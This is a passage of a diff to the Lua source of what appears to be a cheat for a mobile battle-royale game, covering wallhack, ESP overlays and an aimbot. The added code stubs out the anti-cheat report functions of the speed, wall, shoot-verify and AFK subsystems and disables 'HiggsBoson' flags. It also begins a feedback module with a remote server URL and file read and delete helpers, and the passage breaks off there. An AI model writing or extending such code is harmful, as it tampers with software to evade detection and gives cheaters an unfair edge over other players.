-                            if mid == nil and gs.GetMatchId then mid = gs:GetMatchId() end
-                        end
-                    end
-                    if mid == nil then
-                        local pc = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
-                        if pc and pc.PlayerKey then mid = "pk:" .. tostring(pc.PlayerKey) end
-                    end
-                    mid = tostring(mid or "")
-                    if mid ~= "" and mid ~= (_G._MagooReportMatchId or "") then
-                        _G._MagooReportMatchId = mid
-                        cfg._reportedPlayers = {}
-                        cfg._reportQueue = {}
-                        cfg._lastReportTime = 0
-                        _G._MagooLastReport = nil
-                    end
-                end)
-                local master = (_G.GTLMODConfig and _G.GTLMODConfig.AutoReport == true) or false
-                if not master then
-                    cfg.Enable = false
-                    return
-                end
-                cfg.Enable = true
-                cfg.ReportReason = tonumber(_G.GTLMODConfig and _G.GTLMODConfig.AutoReportReason) or 1
-                cfg.ReportDelay = tonumber(_G.GTLMODConfig and _G.GTLMODConfig.AutoReportDelay) or 3.0
-                MagooReportProcessQueue()
-                pcall(function()
-                    local me = nil
-                    if GameplayData and GameplayData.GetPlayerCharacter then
-                        me = GameplayData.GetPlayerCharacter()
-                    end
-                    if not (me and slua.isValid(me)) then return end
-                    local list = nil
-                    pcall(function()
-                        if Game and Game.GetAllPlayerPawns then list = Game:GetAllPlayerPawns() end
-                    end)
-                    local function each(p)
-                        if p and p ~= me then MagooReportPlayer(p) end
-                    end
-                    if type(list) == "table" then
-                        for _, p in pairs(list) do each(p) end
-                    elseif list and list.Num then
-                        for i = 0, list:Num() - 1 do each(list:Get(i)) end
-                    end
-                    pcall(function()
-                        if GameplayData and GameplayData.GetAllCharacters then
-                            local ac = GameplayData.GetAllCharacters()
-                            if type(ac) == "table" then
-                                for _, p in pairs(ac) do each(p) end
-                            end
-                        end
-                    end)
-                end)
-            end
-            _G.MagooReportTick = MagooReportTick
-
-            -- ========== FORCE TPP (DANGER) ==========
-            _G.ForceTPP_Enable = false
-            local _tppHooked, _tppPawn = false, nil
-            local function MagooTppView()
-                if not (_G.GTLMODConfig and _G.GTLMODConfig.ForceTPP == true) then return end
-                pcall(function()
-                    local pc = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
-                    if not (pc and slua.isValid(pc)) then return end
-                    local pawn = nil
-                    if pc.GetPlayerCharacterSafety then pawn = pc:GetPlayerCharacterSafety() end
-                    if not (pawn and slua.isValid(pawn)) then return end
-                    if pawn.bIsWeaponAiming or pawn.bIsGunADS then return end
-                    if pawn.SetCurrentPersonPerspective then pawn:SetCurrentPersonPerspective(false, false) end
-                    if pawn.LocalSwitchPersonPerspective then pawn:LocalSwitchPersonPerspective(false, true, true) end
-                    if pc.SwitchFpp then pc:SwitchFpp(false) end
-                    if pc.PlayerCameraManager and pc.PlayerCameraManager.SetCameraMode then
-                        pc.PlayerCameraManager:SetCameraMode(0)
-                    end
-                    if pawn ~= _tppPawn then _tppHooked = false; _tppPawn = nil end
-                    if pawn.GetIsFPP and not _tppHooked then
-                        local oldFPP = pawn.GetIsFPP
-                        pawn.GetIsFPP = function()
-                            if _G.GTLMODConfig and _G.GTLMODConfig.ForceTPP == true then return false end
-                            return oldFPP()
-                        end
-                        _tppHooked = true
-                        _tppPawn = pawn
-                    end
-                end)
-            end
-            _G.MagooTppView = MagooTppView
-
             _G.WH_COLOR_PALETTE = {
                 [0]  = {0.95, 0.05, 0.05},
                 [1]  = {0.05, 0.95, 0.95},
@@ -4990,11 +2180,18 @@ pcall(function()
             end
             function _G.RefreshWallhackColors()
                 local cfg = _G.GTLMODConfig or {}
-                NewWallhack.colors.vis  = _WH_MakeLC(cfg.ColorEnemyWHVis or 3, 0.50)
-                NewWallhack.colors.occ  = _WH_MakeLC(cfg.ColorEnemyWHOcc or 0, 0.50)
-                NewWallhack.colors.bVis = _WH_MakeLC(cfg.ColorBotWHVis or 1, 0.45)
-                NewWallhack.colors.bOcc = _WH_MakeLC(cfg.ColorBotWHOcc or 2, 0.45)
+                NewWallhack.colors.vis  = _WH_MakeLC(cfg.ColorEnemyWHVis or 3, 0.55)
+                NewWallhack.colors.occ  = _WH_MakeLC(cfg.ColorEnemyWHOcc or 0, 0.55)
+                NewWallhack.colors.bVis = _WH_MakeLC(cfg.ColorBotWHVis or 1, 0.50)
+                NewWallhack.colors.bOcc = _WH_MakeLC(cfg.ColorBotWHOcc or 2, 0.50)
                 NewWallhack.PROCESSED_PAWNS = {}
+                NewWallhack.TICK_COUNT = 0
+                -- Force immediate re-apply on next tick
+                if NewWallhack.Active then
+                    pcall(function()
+                        if NewWallhackTick then NewWallhackTick() end
+                    end)
+                end
             end
             pcall(function()
                 local ticker = package.loaded["common.time_ticker"] or require("common.time_ticker")
@@ -5413,7 +2610,7 @@ pcall(function()
                     BloodRedDim    = Color(0.26, 0.002, 0.008, 0.98),
                     BloodRedShade  = Color(0.10, 0.000, 0.004, 0.66),
                     Yellow         = Color(0.05, 0.90, 0.25, 1.00),
-                    YellowBright   = Color(0.95, 0.95, 0.95, 1.00),
+                    YellowBright   = Color(0.20, 1.00, 0.35, 1.00),
                     YellowSoft     = Color(0.15, 0.85, 0.30, 0.48),
                     YellowDim      = Color(0.00, 0.25, 0.08, 0.98),
                     YellowShade    = Color(0.00, 0.10, 0.03, 0.66),
@@ -5445,10 +2642,10 @@ pcall(function()
                         LocalPawn = nil,
                         EnemyCache = {},
                         EnemyWidgets = {},
-                        MaxEnemies = 12,
+                        MaxEnemies = 20,
                         RangeMeters = 250.0,
-                        ScanInterval = 1.4,
-                        DrawInterval = 0.04,
+                        ScanInterval = 1.0,
+                        DrawInterval = 0.0333,
                         _CanvasScaleX = 1.0,
                         _CanvasScaleY = 1.0,
                         _CanvasOffsetX = 0.0,
@@ -5468,11 +2665,11 @@ pcall(function()
                     }
                     _G.__CLEAR_VISION_ESP_V2 = ClearVisionV2
                 else
-                    ClearVisionV2.DrawInterval = 0.04
-                    ClearVisionV2.ScanInterval = ClearVisionV2.ScanInterval or 1.4
+                    ClearVisionV2.DrawInterval = 0.0333
+                    ClearVisionV2.ScanInterval = ClearVisionV2.ScanInterval or 1.0
                     ClearVisionV2._FrameSerial = ClearVisionV2._FrameSerial or 0
-                    ClearVisionV2._TransformEveryNFrames = ClearVisionV2._TransformEveryNFrames or 14
-                    ClearVisionV2._CounterEveryNFrames = ClearVisionV2._CounterEveryNFrames or 14
+                    ClearVisionV2._TransformEveryNFrames = ClearVisionV2._TransformEveryNFrames or 6
+                    ClearVisionV2._CounterEveryNFrames = ClearVisionV2._CounterEveryNFrames or 6
                     ClearVisionV2._TimerGeneration = ClearVisionV2._TimerGeneration or 0
                 end
                 local REF_W = 688.0
@@ -5706,33 +2903,16 @@ pcall(function()
                     return v
                 end
                 local function GetPlayerName(character)
-                    -- newesp-style: clean + multi-source, bots labeled, max 14 chars
                     if not IsValid(character) then return "ENEMY", false end
-                    local isBot = false
-                    pcall(function()
-                        if Game and Game.IsAI and Game.IsAI(character) == true then isBot = true end
-                    end)
-                    if not isBot then
-                        pcall(function()
-                            if character.bEnsure then isBot = true end
-                            if character.IsAI and character:IsAI() then isBot = true end
-                        end)
-                    end
-                    if isBot then return "Bots", true end
                     local name = nil
                     local function accept(value)
                         if value == nil or value == false then return end
                         local ok, txt = pcall(tostring, value)
-                        if not ok or not txt then return end
-                        txt = txt:gsub("^%s+", ""):gsub("%s+$", "")
-                        if txt == "" or txt == "nil" or txt == "None" or txt == "Player" then return end
-                        if #txt > 14 then txt = txt:sub(1, 14) end
-                        name = txt
+                        if ok and txt ~= "" and txt ~= "nil" and txt ~= "None" then name = txt end
                     end
                     pcall(function()
                         if type(character.GetPlayerNameSafety) == "function" then accept(character:GetPlayerNameSafety()) end
                     end)
-                    if not name then pcall(function() accept(character.PlayerName) end) end
                     if not name then
                         pcall(function()
                             if type(character.GetPlayerName) == "function" then accept(character:GetPlayerName()) end
@@ -6017,35 +3197,32 @@ pcall(function()
                         pcall(function() item.Widget:SetText(tostring(value)) end)
                     end
                 end
-                local function ApplyEnemyTheme(data, isAI, teamId)
+                local function ApplyEnemyTheme(data, isAI)
                     if not data then return end
-                    local tid = tonumber(teamId) or 0
-                    local useRed = (tid % 2) == 1 or tid == 0
-                    -- brackets/box = BLACK only; plate bg = BLACK; name text = RED or WHITE by team
-                    local black = COLORS.Dark2 or Color(0.02, 0.02, 0.02, 0.92)
-                    local pureBlack = Color(0.0, 0.0, 0.0, 0.95)
-                    local textColor = useRed and (COLORS.BloodRedBright or Color(1.0, 0.12, 0.12, 1.0)) or (COLORS.White or Color(0.95, 0.95, 0.95, 1.0))
-                    for _,item in ipairs(data.Arc or {}) do SetBorderColor(item, pureBlack) end
-                    for _,item in ipairs(data.PlateLines or {}) do SetBorderColor(item, pureBlack) end
-                    for _,item in ipairs(data.StatusOuter or {}) do SetBorderColor(item, pureBlack) end
-                    for _,item in ipairs(data.PlateCornerFill or {}) do SetBorderColor(item, pureBlack) end
-                    if data.PlateBGCore then SetBorderColor(data.PlateBGCore, pureBlack) end
-                    if data.PlateBGMid then SetBorderColor(data.PlateBGMid, pureBlack) end
-                    if data.PlateTopGlow then SetBorderColor(data.PlateTopGlow, pureBlack) end
-                    if data.PlateBottomShade then SetBorderColor(data.PlateBottomShade, pureBlack) end
-                    -- snap line color set from EspLineColor at draw time
-                    if false and data.SnapLine then SetBorderColor(data.SnapLine, pureBlack) end
+                    local stroke      = isAI and COLORS.YellowBright or COLORS.BloodRedBright
+                    local innerStroke = isAI and COLORS.Yellow       or COLORS.BloodRed
+                    local dim         = isAI and COLORS.YellowDim    or COLORS.BloodRedDim
+                    local topGlow     = isAI and COLORS.YellowSoft   or COLORS.BloodRedSoft
+                    local bottomShade = isAI and COLORS.YellowShade  or COLORS.BloodRedShade
+                    local textColor   = isAI and COLORS.BotRedText   or COLORS.White
+                    for _,item in ipairs(data.Arc or {}) do SetBorderColor(item, stroke) end
+                    for _,item in ipairs(data.PlateLines or {}) do SetBorderColor(item, stroke) end
+                    for _,item in ipairs(data.StatusOuter or {}) do SetBorderColor(item, stroke) end
+                    for _,item in ipairs(data.PlateCornerFill or {}) do SetBorderColor(item, dim) end
+                    if data.PlateBGCore then SetBorderColor(data.PlateBGCore, dim) end
+                    if data.PlateBGMid then SetBorderColor(data.PlateBGMid, innerStroke) end
+                    if data.PlateTopGlow then SetBorderColor(data.PlateTopGlow, topGlow) end
+                    if data.PlateBottomShade then SetBorderColor(data.PlateBottomShade, bottomShade) end
+                    if data.SnapLine then SetBorderColor(data.SnapLine, stroke) end
                     if data.TitleText then SetTextColor(data.TitleText.Widget, textColor) end
                     if data.DistanceText then SetTextColor(data.DistanceText.Widget, textColor) end
                     if data.DistanceTextBack then SetTextColor(data.DistanceTextBack.Widget, textColor) end
-                    if data.WeaponPlateBG then SetBorderColor(data.WeaponPlateBG, pureBlack) end
-                    if data.WeaponText then SetTextColor(data.WeaponText.Widget, COLORS.White or Color(1,1,1,1)) end
                     data.LastThemeAI = isAI == true
                 end
                 local function ApplyV2FeatureVisibility(data)
                     if not data then return end
                     local showBracket = CV2Flag("EspV2Bracket", true)
-                    local showName = CV2Flag("EspV2Name", false)
+                    local showName = CV2Flag("EspV2Name", true)
                     local showHealth = CV2Flag("EspV2Health", true)
                     local showSnap = CV2Flag("EspV2SnapLine", false)
                     if data.SnapLine then
@@ -6079,12 +3256,6 @@ pcall(function()
                         for _,item in ipairs(data.PlateCornerFill or {}) do
                             if item and item.Widget then SetVisible(item.Widget, showName) end
                         end
-                    end
-                    -- weapon icon uses PlayerMapMarker icons only (no text plate)
-                    if data._VisWeapon ~= false then
-                        data._VisWeapon = false
-                        if data.WeaponPlateBG and data.WeaponPlateBG.Widget then SetVisible(data.WeaponPlateBG.Widget, false) end
-                        if data.WeaponText and data.WeaponText.Widget then SetVisible(data.WeaponText.Widget, false) end
                     end
                     if data._VisHealth ~= showHealth then
                         data._VisHealth = showHealth
@@ -6148,12 +3319,9 @@ pcall(function()
                     }
                     data.PlateBGCore = CreateBorder(root, COLORS.Dark2, 4)
                     data.PlateBGMid = CreateBorder(root, COLORS.Dark2, 4)
-                    data.PlateTopGlow = CreateBorder(root, COLORS.Dark2, 5)
-                    data.PlateBottomShade = CreateBorder(root, COLORS.Dark2, 5)
+                    data.PlateTopGlow = CreateBorder(root, COLORS.GoldSoft, 5)
+                    data.PlateBottomShade = CreateBorder(root, Color(0.05,0.025,0.0,0.50), 5)
                     data.TitleText = CreateText(root, "", COLORS.White, 22, 7)
-                    -- weapon icon plate: same black rectangle + white text as name plate
-                    data.WeaponPlateBG = CreateBorder(root, COLORS.Dark2, 4)
-                    data.WeaponText = CreateText(root, "", COLORS.White, 18, 8)
                     data.DistanceTextBack = CreateText(parent, "", COLORS.Gold, 20, 58)
                     data.DistanceText = CreateText(parent, "", COLORS.Gold, 20, 59)
                     SetFontBold(data.DistanceTextBack and data.DistanceTextBack.Widget)
@@ -6274,16 +3442,6 @@ pcall(function()
                     local textPad=math.max(6.0,cut*0.60)
                     SetRect(data.TitleText,plateX+textPad,plateY+2,plateW-textPad*2,plateH-4)
                     SetFontSize(data.TitleText.Widget,nameFont)
-                    -- weapon plate under name (black box + white text)
-                    if data.WeaponPlateBG and data.WeaponText then
-                        local wpnH = math.max(14, plateH * 0.85)
-                        local wpnY = plateY + plateH + Clamp(4*s, 2, 6)
-                        local wpnW = plateW * 0.92
-                        local wpnX = plateX + (plateW - wpnW) * 0.5
-                        SetRect(data.WeaponPlateBG, wpnX, wpnY, wpnW, wpnH)
-                        SetRect(data.WeaponText, wpnX+textPad, wpnY+1, wpnW-textPad*2, wpnH-2)
-                        SetFontSize(data.WeaponText.Widget, math.max(11, nameFont * 0.85))
-                    end
                     for i=1,8 do
                         local a=pts[i]
                         local b=pts[(i%8)+1]
@@ -6303,7 +3461,7 @@ pcall(function()
                 end
                 local function UpdateHealthSegments(data, pct, isAI)
                     if not data then return end
-                    local themeColor=COLORS.BloodRedBright
+                    local themeColor=isAI and COLORS.YellowBright or COLORS.BloodRedBright
                     local progress=math.max(0,math.min(1,pct or 0))*4.0
                     for i=1,4 do
                         local c
@@ -6573,12 +3731,7 @@ pcall(function()
                                             seen[key]=true
                                             local name,resolved=GetPlayerName(pawn)
                                             local bot=IsAI(pawn)
-                                            local tid=0
-                                            pcall(function()
-                                                if type(pawn.GetTeamID)=="function" then tid=tonumber(pawn:GetTeamID()) or 0
-                                                elseif pawn.TeamID~=nil then tid=tonumber(pawn.TeamID) or 0 end
-                                            end)
-                                            candidates[#candidates+1]={Key=key,Pawn=pawn,Distance=d,Name=name,NameResolved=resolved,IsAI=bot,TeamID=tid}
+                                            candidates[#candidates+1]={Key=key,Pawn=pawn,Distance=d,Name=name,NameResolved=resolved,IsAI=bot}
                                         end
                                     end
                                 end
@@ -6592,7 +3745,7 @@ pcall(function()
                     for i=1,count do
                         local c=candidates[i]
                         selected[c.Key]=c.Pawn
-                        meta[c.Key]={Name=c.Name,NameResolved=c.NameResolved,IsAI=c.IsAI,TeamID=c.TeamID or 0}
+                        meta[c.Key]={Name=c.Name,NameResolved=c.NameResolved,IsAI=c.IsAI}
                         if c.IsAI then botCount=botCount+1 else realCount=realCount+1 end
                     end
                     local stale={}
@@ -6788,13 +3941,8 @@ pcall(function()
                             if needWidgets and data and headLoc and feetLoc and worldLoc then
                                 local meta=ClearVisionV2.EnemyMeta[key] or {}
                                 local isAI=meta.IsAI==true
-                                local tid=(meta.TeamID or 0)
-                                if data.LastThemeAI~=isAI or data.LastThemeTeam~=tid then
-                                    ApplyEnemyTheme(data,isAI,tid)
-                                    data.LastThemeAI=isAI
-                                    data.LastThemeTeam=tid
-                                end
-                                local themeColor=((tid % 2)==1 or tid==0) and COLORS.BloodRedBright or COLORS.White
+                                if data.LastThemeAI~=isAI then ApplyEnemyTheme(data,isAI) end
+                                local themeColor=isAI and COLORS.YellowBright or COLORS.BloodRedBright
                                 local proj=ClearVisionV2._ProjectionCache[key]
                                 if not proj then proj={Head={},Feet={}} ClearVisionV2._ProjectionCache[key]=proj end
                                 local headOK,head=ProjectToCanvas(pc,headLoc,proj.Head)
@@ -6825,12 +3973,12 @@ pcall(function()
                                     local name=meta.Name
                                     if not name or name=="" then name=select(1,GetPlayerName(character)) end
                                     name=tostring(name or "ENEMY")
-                                    if not data.LastScale or math.abs(data.LastScale-s)>0.025 or data.LastName~=name then
+                                    if not data.LastScale or math.abs(data.LastScale-s)>0.003 or data.LastName~=name then
                                         LayoutEnemy(data,s,name)
                                         data.LastName=name
-                                        ApplyEnemyTheme(data,isAI,meta.TeamID or 0)
+                                        ApplyEnemyTheme(data,isAI)
                                     end
-                                    if not data.LastX or math.abs(data.LastX-rootX)>0.35 or not data.LastY or math.abs(data.LastY-rootY)>0.35 then
+                                    if not data.LastX or math.abs(data.LastX-rootX)>0.2 or not data.LastY or math.abs(data.LastY-rootY)>0.2 then
                                         pcall(function() data.RootSlot:SetPosition(V2(rootX,rootY)) end)
                                         data.LastX,data.LastY=rootX,rootY
                                     end
@@ -6870,22 +4018,7 @@ pcall(function()
                                 end
                                 if data.SnapLine then
                                     if topOrigin and lineOnScreen and CV2Flag("EspV2SnapLine", false) then
-                                        local lineCol = COLORS.GoldBright or COLORS.Gold or COLORS.White
-                                        do
-                                            local idx = tonumber(_G.GTLMODConfig and _G.GTLMODConfig.EspLineColor) or 6
-                                            local pal = {
-                                                Color(0.02, 0.02, 0.02, 1.0),
-                                                Color(0.95, 0.95, 0.95, 1.0),
-                                                Color(1.00, 0.12, 0.12, 1.0),
-                                                Color(0.12, 0.90, 0.18, 1.0),
-                                                Color(0.20, 0.45, 1.00, 1.0),
-                                                Color(1.00, 0.85, 0.15, 1.0),
-                                            }
-                                            if idx < 1 then idx = 1 end
-                                            if idx > 6 then idx = 6 end
-                                            lineCol = pal[idx] or lineCol
-                                        end
-                                        SetBorderColor(data.SnapLine, lineCol)
+                                        SetBorderColor(data.SnapLine, COLORS.GoldBright or COLORS.Gold or COLORS.White)
                                         SetLine(data.SnapLine,topOrigin.X,topOrigin.Y,head.X,head.Y,2.0)
                                         SetSnapVisible(data,true)
                                     else
@@ -8365,7 +5498,7 @@ pcall(function()
                     pcall(function()
                         local c = _G.GTLMODConfig or {}
                         if _G.LexusConfig then
-                            _G.LexusConfig.EspLoai9 = (c.EspBox or c.EspLine or c.CounterEnabled or c.EspModelName or c.EspWeaponIcon or c.EspRadar) and true or false
+                            _G.LexusConfig.EspLoai9 = (c.EspLine or c.CounterEnabled or c.EspModelName or c.EspWeaponIcon or c.EspBox) and true or false
                         end
                         if c.TargetFPS or c.FPSStabilizer then _G.GTLMODState.GraphicsUnlocked = false end
                         if c.WallhackSmart and NewWallhack then
@@ -8373,10 +5506,34 @@ pcall(function()
                             NewWallhack.Active = false
                         end
                         _G.GTLMODState.OrigAutoAimCompCached = nil
+                        _G._SubsystemSpoofDone = false
                         _G.PrivAimVisCache = {}
                         _G.PrivAimBotCache = {}
                         _G.AimTouchVisCache = {}
                         _G._PrivAimCacheLastFlush = 0
+                        -- Force full feature rebind on new match so toggles stay live
+                        pcall(function()
+                            if type(_G.EnsureModFeaturesRunning) == "function" then
+                                _G.EnsureModFeaturesRunning()
+                            end
+                        end)
+                        pcall(function()
+                            local cv = rawget(_G, "__CLEAR_VISION_ESP_V2")
+                            if c.EspBox == true and type(cv) == "table" then
+                                if type(cv.Start) == "function" then cv.Start() end
+                                if type(cv.SyncEnabled) == "function" then cv.SyncEnabled() end
+                            end
+                        end)
+                        pcall(function()
+                            if c.WallhackSmart and _G.StartNewWallhack then
+                                _G.StartNewWallhack()
+                            end
+                        end)
+                        pcall(function()
+                            if (c.EspWeaponIcon or c.EspModelName) and _G.PlayerMapMarker then
+                                if _G.PlayerMapMarker.Start then _G.PlayerMapMarker.Start() end
+                            end
+                        end)
                     end)
                 end
                 local Cached_MyHUD = pc and pc.MyHUD or nil
@@ -8390,25 +5547,23 @@ pcall(function()
                         _G._LexusSyncFP = _syncFP
                         local L = _G.LexusConfig or {}
                         _G.LexusConfig = L
-                        local any = c.EspModelName or c.EspWeaponIcon or c.EspBox
+                        local any = c.EspModelName or c.EspWeaponIcon or c.EspBox or c.EspLine or c.CounterEnabled
                         L.EspLoai9 = any and true or false
-                        -- keep each feature flag independent; never zero out line/count here
                         L.Esp9_Count = c.CounterEnabled == true
                         L.Esp9_Line = c.EspLine == true
                         pcall(function()
                             local cv = rawget(_G, "__CLEAR_VISION_ESP_V2")
                             if type(cv) ~= "table" then return end
-                            -- do NOT force EspBox on; only start ClearVision when EspBox itself is already on
-                            if c.EspBox == true or c.Esp5 == true or c.EspV2Enabled == true then
+                            -- Box ESP is independent; never stop it just because weapon icon changed
+                            if c.EspBox == true or c.CounterEnabled == true or c.EspLine == true then
                                 if type(cv.Start) == "function" then cv.Start() end
                                 if type(cv.SyncEnabled) == "function" then cv.SyncEnabled() end
                             end
-                            -- weapon icon / line / counter never force or stop ClearVision
                         end)
                         L.Esp9_Name = c.EspModelName == true
                         L.Esp9_HP = (c.EspModelName == true) and (c.EspShowHealthBar ~= false)
                         L.Esp9_Team = (c.EspModelName == true) and (c.EspTeamColorBox ~= false)
-                        L.Esp9_Weapon = false
+                        L.Esp9_Weapon = c.EspWeaponIcon == true
                         L.Esp9_Distance = (c.EspModelName == true) and (c.EspShowDistance ~= false)
                         L.Esp9_Line = c.EspLine == true
                         L.EspActiveBom = c.EspActiveBom == true
@@ -8442,12 +5597,49 @@ pcall(function()
                         pcall(function() _G.RJCounter.SetEnabled(false) end)
                     end
                 end)
+                if not _G._SubsystemSpoofDone then
+                    _G._SubsystemSpoofDone = true
+                    pcall(function()
+                        local SubMgr = package.loaded["GameLua.GameCore.Module.Subsystem.SubsystemMgr"]
+                        if not SubMgr then return end
+                        local targets = {
+                            "AFKReportorSubsystem",
+                            "SpeedCheckSubsystem",
+                            "WallCheckSubsystem",
+                            "ShootVerifySubSystemClient",
+                        }
+                        for _, subName in ipairs(targets) do
+                            pcall(function()
+                                local sub = SubMgr:Get(subName)
+                                if not sub then return end
+                                local reportFns = {
+                                    "ReportSpeedCheatToServer",
+                                    "ReportWallCheatToServer",
+                                    "ReportShootVerifyFailed",
+                                    "ReportAFKToServer",
+                                    "SendReport",
+                                    "DoReport",
+                                    "Report",
+                                }
+                                for _, fnName in ipairs(reportFns) do
+                                    if type(sub[fnName]) == "function" then
+                                        sub[fnName] = function() end
+                                    end
+                                end
+                            end)
+                        end
+                    end)
+                end
                 if _G.GTLMODConfig then InitializeGraphicsUnlock() end
                 InitializeNativeESP()
-                pcall(function() if _G.MagooReportTick then _G.MagooReportTick() end end)
-                pcall(function() if _G.MagooTppView then _G.MagooTppView() end end)
                 pcall(function()
                     ApplyIpadFOVState(pc, localPlayer)
+                end)
+                pcall(function()
+                    if Valid(pc) then
+                        if pc.HiggsBoson then pc.HiggsBoson.bMHActive = false; pc.HiggsBoson.bCallPreReplication = false end
+                        if pc.HiggsBosonComponent then pc.HiggsBosonComponent.bMHActive = false; pc.HiggsBosonComponent.bCallPreReplication = false end
+                    end
                 end)
                 pcall(function()
                     local autoComp = localPlayer.AutoAimComp
@@ -8973,14 +6165,32 @@ pcall(function()
             local function PrivFeaturesTick()
                 if isExpired then return end
                 if myToken ~= _G.GTLMODState.LoopToken then return end
-                -- small crosshair removed
+                local now = os.clock()
+                pcall(function()
+                    local pawn = GameplayData and GameplayData.GetPlayerCharacter and GameplayData.GetPlayerCharacter()
+                    if not (pawn and slua.isValid(pawn)) then return end
+                    if _G.GTLMODConfig.PrivSmallCrosshair then
+                        if not _G.PrivWeaponInstance then
+                            _G.PrivWeaponInstance = HackerWeaponFeatures.new(_G)
+                        end
+                        _G.PrivWeaponInstance:update(pawn, { smallCrosshair = true }, now)
+                    else
+                        if _G.PrivWeaponInstance then
+                            _G.PrivWeaponInstance:update(pawn, { smallCrosshair = false }, now)
+                            if not _G.PrivWeaponInstance.restoring then
+                                pcall(_G.PrivWeaponInstance.dispose, _G.PrivWeaponInstance)
+                                _G.PrivWeaponInstance = nil
+                            end
+                        end
+                    end
+                end)
                 local forceOn = (_G.GTLMODConfig and _G.GTLMODConfig.ForceAimbot == true)
                     or (_G._ForceAimbotWanted == true)
                 if forceOn then
                     if _G.GTLMODConfig then _G.GTLMODConfig.ForceAimbot = true end
                     pcall(PrivAimbotTick)
                 end
-                local anyPriv = (_G.GTLMODConfig and _G.GTLMODConfig.ForceAimbot)
+                local anyPriv = (_G.GTLMODConfig and (_G.GTLMODConfig.PrivSmallCrosshair or _G.GTLMODConfig.ForceAimbot))
                     or (_G._ForceAimbotWanted == true)
                 local ticker = GetTicker()
                 if ticker and ticker.AddTimerOnce then
@@ -9053,9 +6263,19 @@ pcall(function()
                     L.Esp9_Name = c.EspModelName == true
                     L.Esp9_HP = (c.EspModelName == true) and (c.EspShowHealthBar ~= false)
                     L.Esp9_Team = (c.EspModelName == true) and (c.EspTeamColorBox ~= false)
-                    L.Esp9_Weapon = false
+                    L.Esp9_Weapon = c.EspWeaponIcon == true
                     L.Esp9_Distance = (c.EspModelName == true) and (c.EspShowDistance ~= false)
                     L.Esp9_Line = c.EspLine == true
+                    -- Always keep Box ESP independent of weapon icon
+                    if c.EspBox == true then
+                        pcall(function()
+                            local cv = rawget(_G, "__CLEAR_VISION_ESP_V2")
+                            if type(cv) == "table" then
+                                if type(cv.Start) == "function" then cv.Start() end
+                                if type(cv.SyncEnabled) == "function" then cv.SyncEnabled() end
+                            end
+                        end)
+                    end
                     L.EspActiveBom = c.EspActiveBom == true
                     L.EspBomMaster = c.EspActiveBom == true
                     if _G.PlayerMapMarker and not _G.PlayerMapMarker.bActive and L.EspLoai9 then
@@ -9104,11 +6324,12 @@ pcall(function()
             function BRPlayerCharacterBase:ESP_Toggle()
                 local c = _G.GTLMODConfig
                 if not c then return false end
-                -- only toggles snap line flag; never starts/stops shared systems that other features use
                 c.EspLine = not c.EspLine
-                c.EspV2SnapLine = c.EspLine
-                if _G.LexusConfig then _G.LexusConfig.Esp9_Line = c.EspLine end
-                if type(_G.ClearVisionV2Sync) == "function" then pcall(_G.ClearVisionV2Sync) end
+                if c.EspLine then
+                    self:ESP_Start()
+                else
+                    self:ESP_Stop()
+                end
                 return c.EspLine
             end
             function BRPlayerCharacterBase:ESP_IsEnabled()
@@ -9269,8 +6490,446 @@ pcall(function()
             function BRPlayerCharacterBase:SwitchCameraToParachuteFalling() self.Super:SwitchCameraToParachuteFalling() end
             function BRPlayerCharacterBase:SwitchCameraToNormal() self.Super:SwitchCameraToNormal() end
             function BRPlayerCharacterBase:SwitchWeaponCheck(Slot, IgnoreState) return self.Super:SwitchWeaponCheck(Slot, IgnoreState) end
-            
-            
+            if not isExpired then
+            pcall(function()
+            local AutoFeedback = {
+                Config = {
+                    ServerURL = "https://magoo-feedback.arshaan0819.workers.dev",
+                    TestMode = false
+                },
+                Hooked = false
+            }
+            local function AFLog(message)
+                local IST_OFFSET = 19800
+                print(string.format("[MAGOO_FB] [%s IST] %s", os.date("!%H:%M:%S", os.time() + IST_OFFSET), tostring(message)))
+            end
+            local function AFNotify(message)
+                if _G.SRCHUBNotify then pcall(_G.SRCHUBNotify, message)
+                elseif _G.Notify then pcall(_G.Notify, message) end
+            end
+            local function AFGetModule(name, allowRequire)
+                local loaded = package and package.loaded and package.loaded[name]
+                if loaded then return loaded end
+                if allowRequire == false then return nil end
+                local ok, module = pcall(require, name)
+                if ok then return module end
+                return nil
+            end
+            local function AFAddTimerOnce(delay, callback)
+                local ticker = AFGetModule("common.time_ticker")
+                if ticker and type(ticker.AddTimerOnce) == "function" then
+                    ticker.AddTimerOnce(delay, callback)
+                    return true
+                end
+                return false
+            end
+            local function AFBase64Encode(data)
+                if type(data) ~= "string" or #data == 0 then return "" end
+                local alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+                local output = {}
+                local outputIndex = 0
+                local index = 1
+                while index <= #data - 2 do
+                    local a, b, c = string.byte(data, index, index + 2)
+                    local value = a * 65536 + b * 256 + c
+                    outputIndex = outputIndex + 1
+                    output[outputIndex] = string.char(
+                        string.byte(alphabet, math.floor(value / 262144) + 1),
+                        string.byte(alphabet, math.floor(value / 4096) % 64 + 1),
+                        string.byte(alphabet, math.floor(value / 64) % 64 + 1),
+                        string.byte(alphabet, value % 64 + 1)
+                    )
+                    index = index + 3
+                end
+                local remaining = #data - index + 1
+                if remaining == 2 then
+                    local a, b = string.byte(data, index, index + 1)
+                    local value = a * 65536 + b * 256
+                    outputIndex = outputIndex + 1
+                    output[outputIndex] = string.char(
+                        string.byte(alphabet, math.floor(value / 262144) + 1),
+                        string.byte(alphabet, math.floor(value / 4096) % 64 + 1),
+                        string.byte(alphabet, math.floor(value / 64) % 64 + 1),
+                        string.byte("=")
+                    )
+                elseif remaining == 1 then
+                    local value = string.byte(data, index) * 65536
+                    outputIndex = outputIndex + 1
+                    output[outputIndex] = string.char(
+                        string.byte(alphabet, math.floor(value / 262144) + 1),
+                        string.byte(alphabet, math.floor(value / 4096) % 64 + 1),
+                        string.byte("="),
+                        string.byte("=")
+                    )
+                end
+                return table.concat(output)
+            end
+            local function AFUrlEncode(value)
+                if value == nil then return nil end
+                value = tostring(value):gsub("\n", "\r\n")
+                value = value:gsub("([^A-Za-z0-9 %-%_%.%~])", function(character)
+                    return string.format("%%%02X", string.byte(character))
+                end)
+                value = value:gsub(" ", "+")
+                return value
+            end
+            local function AFReadFile(path)
+                local file = io.open(path, "rb")
+                if not file then return "" end
+                local data = file:read("*a") or ""
+                file:close()
+                return data
+            end
+            local function AFRemoveFile(path)
+                pcall(os.remove, path)
+            end
+            local function AFGetRankName(rank)
